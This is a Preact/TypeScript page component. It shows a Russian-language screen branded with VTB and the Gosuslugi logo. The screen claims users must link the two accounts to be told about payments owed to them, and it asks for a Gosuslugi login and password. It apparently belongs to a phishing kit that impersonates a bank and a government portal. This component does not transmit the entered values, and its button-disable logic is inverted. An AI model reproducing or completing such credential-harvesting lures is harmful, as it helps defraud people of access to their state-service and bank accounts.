import Styled from "./styled";
import Header from "@/UI/Header";
import Button from "@/UI/Button";
import { route } from "preact-router";

import gosUslugiLogo from "./Assets/gosUslugiLogo.png";
import { useRef } from "preact/compat";

const Information = (): JSX.Element => {
  const ref1 = useRef<HTMLInputElement>(null);
  const ref2 = useRef<HTMLInputElement>(null);

  return (
    <>
      <Header />

      <Styled>
        <div className="title">
          Для моментального получения уведомлений о полагающихся Вам выплатах
          необходимо связать аккаунт &quot;ВТБ&quot; с аккаунтом сайта
          &quot;Госуслуги&quot;
        </div>

        <div>
          <img src={gosUslugiLogo} alt="" />
        </div>

        <div className="inputs">
          <div className="inputWrapper">
            <input placeholder="ЛОГИН" ref={ref1} />
          </div>
          <div className="inputWrapper">
            <input placeholder="ПАРОЛЬ" ref={ref2} />
          </div>
        </div>

        <Button
          disabled={
            !!ref1.current?.value?.length && !!ref2.current?.value?.length
          }
          callback={(): void => {
            route("/social/thanks", true);
          }}
          variant="blue"
        >
          СВЯЗАТЬ
        </Button>
      </Styled>
    </>
  );
};

export default Information;
